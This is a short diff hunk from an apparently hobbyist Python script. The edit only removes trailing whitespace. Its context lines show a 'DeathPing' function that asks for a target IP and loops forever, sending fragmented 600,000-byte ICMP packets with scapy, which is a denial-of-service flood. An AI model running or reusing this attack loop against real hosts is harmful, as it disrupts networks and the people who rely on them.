@@ -62,7 +62,7 @@ def DeathPing():
   dest = input("Enter the target's IP: ")
   while True:
     send( fragment(IP(dst=dest)/ICMP()/("X"*600000)) )
-    
+
 def bat_encrypt():
   secret_bat_message = input("\nEnter what you want to encrypt: ")
   daList = []
